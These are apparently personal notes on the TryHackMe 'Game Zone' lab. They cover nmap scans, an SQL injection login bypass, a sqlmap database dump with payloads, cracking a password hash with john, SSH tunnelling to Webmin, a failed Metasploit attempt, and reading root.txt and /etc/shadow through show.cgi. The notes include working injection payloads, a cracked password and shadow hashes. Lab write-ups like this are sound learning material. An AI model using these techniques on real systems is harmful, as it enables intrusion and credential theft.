@@ -1,0 +1,347 @@
+
+
+
+
+sqlmap injecting searchbar  // reverse ssh port // escalation with msf (never worked) // using url manipulation we get flag 
+
+
+port 80 reveals a login ,, 
+
+ nmap 10.10.2.158 -oN nmap0            
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-23 13:12 EST
+Nmap scan report for 10.10.2.158
+Host is up (0.12s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 17.31 seconds
+
+
+nmap -sV -A -sC -T5 10.10.2.158 -oN nmap1                             130 ⨯
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-23 13:14 EST
+Nmap scan report for 10.10.2.158
+Host is up (0.12s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 61:ea:89:f1:d4:a7:dc:a5:50:f7:6d:89:c3:af:0b:03 (RSA)
+|   256 b3:7d:72:46:1e:d3:41:b6:6a:91:15:16:c9:4a:a5:fa (ECDSA)
+|_  256 53:67:09:dc:ff:fb:3a:3e:fb:fe:cf:d8:6d:41:27:ab (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Game Zone
+Aggressive OS guesses: Linux 3.10 - 3.13 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 5.4 (94%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Sony Android TV (Android 5.0) (92%), Android 5.0 - 6.0.1 (Linux 3.4) (92%), Android 5.1 (92%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 587/tcp)
+HOP RTT       ADDRESS
+1   113.03 ms 10.9.0.1
+2   113.19 ms 10.10.2.158
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 34.89 seconds
+
+
+they run us througth some basic login injections  admin: ' or 1=1 -- -    and   ' or 1=1 -- - :blank  ,, it logs us in and gives us a 
+portal page with a searchbar ,,
+
+putting a ' in search gives us database ,,,
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'' at line 1 
+
+
+we are going to use burpsuite to intercept a search input,, and give that info to sqlmap so ,, 
+
+
+
+sqlmap -r post.txt --dbms=mysql --dump
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.5.2#stable}
+|_ -| . [(]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 13:35:27 /2021-02-23/
+
+[13:35:27] [INFO] parsing HTTP request from 'post.txt'
+[13:35:27] [INFO] testing connection to the target URL
+[13:35:28] [INFO] testing if the target URL content is stable
+[13:35:28] [INFO] target URL content is stable
+[13:35:28] [INFO] testing if POST parameter 'searchitem' is dynamic
+[13:35:28] [WARNING] POST parameter 'searchitem' does not appear to be dynamic
+[13:35:28] [INFO] heuristic (basic) test shows that POST parameter 'searchitem' might be injectable (possible DBMS: 'MySQL')
+[13:35:29] [INFO] heuristic (XSS) test shows that POST parameter 'searchitem' might be vulnerable to cross-site scripting (XSS) attacks
+[13:35:29] [INFO] testing for SQL injection on POST parameter 'searchitem'
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
+[13:35:33] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[13:35:34] [WARNING] reflective value(s) found and filtering out
+[13:35:35] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[13:35:36] [INFO] testing 'Generic inline queries'
+[13:35:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[13:35:42] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[13:35:43] [INFO] POST parameter 'searchitem' appears to be 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)' injectable (with --string="11")
+[13:35:43] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[13:35:43] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[13:35:43] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[13:35:44] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[13:35:44] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[13:35:44] [INFO] POST parameter 'searchitem' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable 
+[13:35:44] [INFO] testing 'MySQL inline queries'
+[13:35:44] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[13:35:44] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
+[13:35:44] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[13:35:45] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[13:35:45] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
+[13:35:45] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
+[13:35:45] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[13:35:56] [INFO] POST parameter 'searchitem' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+[13:35:56] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[13:35:56] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
+[13:35:56] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[13:35:56] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[13:35:56] [INFO] target URL appears to have 3 columns in query
+[13:35:57] [INFO] POST parameter 'searchitem' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
+[13:35:57] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
+POST parameter 'searchitem' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
+sqlmap identified the following injection point(s) with a total of 88 HTTP(s) requests:
+---
+Parameter: searchitem (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: searchitem=-5400' OR 2075=2075#
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: searchitem=test' AND GTID_SUBSET(CONCAT(0x71786a6271,(SELECT (ELT(9606=9606,1))),0x716b786271),9606)-- XFXC
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: searchitem=test' AND (SELECT 5457 FROM (SELECT(SLEEP(5)))WrFX)-- FKuq
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 3 columns
+    Payload: searchitem=test' UNION ALL SELECT NULL,NULL,CONCAT(0x71786a6271,0x696a6c7a66786372544e4b51724b5852584c4352656d4d5876436555634d74766c48516f4f555875,0x716b786271)#
+---
+[13:36:02] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 16.04 or 16.10 (xenial or yakkety)
+web application technology: Apache 2.4.18
+back-end DBMS: MySQL >= 5.6
+[13:36:03] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
+[13:36:03] [INFO] fetching current database
+[13:36:03] [INFO] fetching tables for database: 'db'
+[13:36:03] [INFO] fetching columns for table 'post' in database 'db'
+[13:36:03] [INFO] fetching entries for table 'post' in database 'db'
+Database: db
+Table: post
+[5 entries]
++----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| id | name                           | description                                                                                                                                                                                            |
++----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| 1  | Mortal Kombat 11               | Its a rare fighting game that hits just about every note as strongly as Mortal Kombat 11 does. Everything from its methodical and deep combat.                                                         |
+| 2  | Marvel Ultimate Alliance 3     | Switch owners will find plenty of content to chew through, particularly with friends, and while it may be the gaming equivalent to a Hulk Smash, that isnt to say that it isnt a rollicking good time. |
+| 3  | SWBF2 2005                     | Best game ever                                                                                                                                                                                         |
+| 4  | Hitman 2                       | Hitman 2 doesnt add much of note to the structure of its predecessor and thus feels more like Hitman 1.5 than a full-blown sequel. But thats not a bad thing.                                          |
+| 5  | Call of Duty: Modern Warfare 2 | When you look at the total package, Call of Duty: Modern Warfare 2 is hands-down one of the best first-person shooters out there, and a truly amazing offering across any system.                      |
++----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+
+[13:36:03] [INFO] table 'db.post' dumped to CSV file '/root/.local/share/sqlmap/output/10.10.2.158/dump/db/post.csv'
+[13:36:03] [INFO] fetching columns for table 'users' in database 'db'
+[13:36:04] [INFO] fetching entries for table 'users' in database 'db'
+[13:36:04] [INFO] recognized possible password hashes in column 'pwd'
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] n
+do you want to crack them via a dictionary-based attack? [Y/n/q] y
+[13:36:22] [INFO] using hash method 'sha256_generic_passwd'
+what dictionary do you want to use?
+[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
+[2] custom dictionary file
+[3] file with list of dictionary files
+> 
+[13:36:30] [INFO] using default dictionary
+do you want to use common password suffixes? (slow!) [y/N] n
+[13:36:34] [INFO] starting dictionary-based cracking (sha256_generic_passwd)
+[13:36:34] [INFO] starting 2 processes 
+[13:38:00] [WARNING] no clear password(s) found                                                                                                                         
+Database: db
+Table: users
+[1 entry]
++------------------------------------------------------------------+----------+
+| pwd                                                              | username |
++------------------------------------------------------------------+----------+
+| ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 | agent47  |
++------------------------------------------------------------------+----------+
+
+[13:38:00] [INFO] table 'db.users' dumped to CSV file '/root/.local/share/sqlmap/output/10.10.2.158/dump/db/users.csv'
+[13:38:00] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.10.2.158'
+
+[*] ending @ 13:38:00 /2021-02-23/
+
+It tried to crack it , but better job for john,,
+
+Usage: john [OPTIONS] [PASSWORD-FILES]
+
+agent47:ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 
+
+john --format=raw-sha256 hash.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-SHA256 [SHA256 256/256 AVX2 8x])
+No password hashes left to crack (see FAQ)
+                                                                                
+┌──(root💀kali)-[/hackme/gamezone]
+└─# john --format=raw-sha256 hash.txt --show
+?:videogamer124
+
+1 password hash cracked, 0 left
+
+
+agent47:videogamer124
+
+
+
+Reverse SSH port forwarding specifies that the given port on the remote server host is to be forwarded to the given host and port on the local side.
+
+-L is a local tunnel (YOU <-- CLIENT). If a site was blocked, you can forward the traffic to a server you own and view it. For example, if imgur was blocked at work, you can do ssh -L 9000:imgur.com:80 user@example.com. Going to localhost:9000 on your machine, will load imgur traffic using your other server.
+
+-R is a remote tunnel (YOU --> CLIENT). You forward your traffic to the other server for others to view. Similar to the example above, but in reverse.
+
+
+
+
+
+We will use a tool called ss to investigate sockets running on a host.
+
+If we run ss -tulpn it will tell us what socket connections are running
+
+ssh -L 10000:localhost:10000 agent47@10.10.2.158                      127 ⨯
+The authenticity of host '10.10.2.158 (10.10.2.158)' can't be established.
+ECDSA key fingerprint is SHA256:mpNHvzp9GPoOcwmWV/TMXiGwcqLIsVXDp5DvW26MFi8.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.2.158' (ECDSA) to the list of known hosts.
+agent47@10.10.2.158's password: 
+Permission denied, please try again.
+agent47@10.10.2.158's password: 
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+109 packages can be updated.
+68 updates are security updates.
+
+
+Last login: Fri Aug 16 17:52:04 2019 from 192.168.1.147
+agent47@gamezone:~$ 
+
+
+agent47@gamezone:~$ ss -tulpn
+Netid  State      Recv-Q Send-Q Local Address:Port               Peer Address:Port              
+udp    UNCONN     0      0         *:68                    *:*                  
+udp    UNCONN     0      0         *:10000                 *:*                  
+tcp    LISTEN     0      128       *:22                    *:*                  
+tcp    LISTEN     0      80     127.0.0.1:3306                  *:*                  
+tcp    LISTEN     0      128       *:10000                 *:*                  
+tcp    LISTEN     0      128      :::22                   :::*                  
+tcp    LISTEN     0      128      :::80                   :::*           
+
+
+
+we navigate to localhost:10000 and login sussessfully, 
+
+Webmin version 	1.580
+
+
+
+
+
+escalation
+
+
+
+searchsploit Webmin 1.580        
+---------------------------------------------- ---------------------------------
+ Exploit Title                                |  Path
+---------------------------------------------- ---------------------------------
+Webmin 1.580 - '/file/show.cgi' Remote Comman | unix/remote/21851.rb
+Webmin < 1.920 - 'rpc.cgi' Remote Code Execut | linux/webapps/47330.rb
+---------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+
+
+went to writeup for some wisdom,,,, 
+https://www.notion.so/Game-Zone-Tryhackme-2e762633c6234e3b9e1fbb0bcf743fcb
+
+tried for like two hours with msf with no luck,, it would not authenticate 
+
+[*] Started reverse TCP handler on 10.9.4.45:4444 
+[*] Attempting to login...
+[-] Authentication failed
+[*] Exploit completed, but no session was created.
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) > 
+
+
+
+then looked at the third write up,, and we just needed to add a few lines to the url to navigate through data
+
+https://medium.com/@aniyazov2500/tryhackme-gamezone-1a5b13fbdf2a
+
+
+"Digging into this exploit, I found the official documentation of it
+
+    http://www.americaninfosec.com/research/dossiers/AISG-12-001.pdf
+
+The documentation shows that adding /file/show.cgi to the URL allows you to read file locations (as root) 
+when adding a file past the ‘show.cgi’"
+
+
+
+http://localhost:10000/file/show.cgi/root/root.txt
+
+a4b945830144bdd71908d12d902adeee    is shown in screen
+
+
+http://localhost:10000/file/show.cgi/etc/shadow
+
+
+root:$6$Llhg4MdC$f9TRe8xLelwHpj5JvCNprpWBnHppEnryPo1mGiKW2U71SpTVZRRE0f7/3kZsIwNsRpcc7GlcVSnuYfiN5n7Yw.:18124:0:99999:7:::
+daemon:*:17953:0:99999:7:::
+bin:*:17953:0:99999:7:::
+sys:*:17953:0:99999:7:::
+sync:*:17953:0:99999:7:::
+games:*:17953:0:99999:7:::
+man:*:17953:0:99999:7:::
+lp:*:17953:0:99999:7:::
+mail:*:17953:0:99999:7:::
+news:*:17953:0:99999:7:::
+uucp:*:17953:0:99999:7:::
+proxy:*:17953:0:99999:7:::
+www-data:*:17953:0:99999:7:::
+backup:*:17953:0:99999:7:::
+list:*:17953:0:99999:7:::
+irc:*:17953:0:99999:7:::
+gnats:*:17953:0:99999:7:::
+nobody:*:17953:0:99999:7:::
+systemd-timesync:*:17953:0:99999:7:::
+systemd-network:*:17953:0:99999:7:::
+systemd-resolve:*:17953:0:99999:7:::
+systemd-bus-proxy:*:17953:0:99999:7:::
+syslog:*:17953:0:99999:7:::
+_apt:*:17953:0:99999:7:::
+lxd:*:18122:0:99999:7:::
+messagebus:*:18122:0:99999:7:::
+uuidd:*:18122:0:99999:7:::
+dnsmasq:*:18122:0:99999:7:::
+sshd:*:18122:0:99999:7:::
+agent47:$6$QRnDATVa$Dhv2K3GVe40X5hxB/vrdBeBDOYwtwGzFZfEL6/MdvOyO6S2w6pmaZy/h4j.3DKrCGtXoqkVTy.PDJsuOeZ6In1:18124:0:99999:7:::
+mysql:!:18122:0:99999:7:::
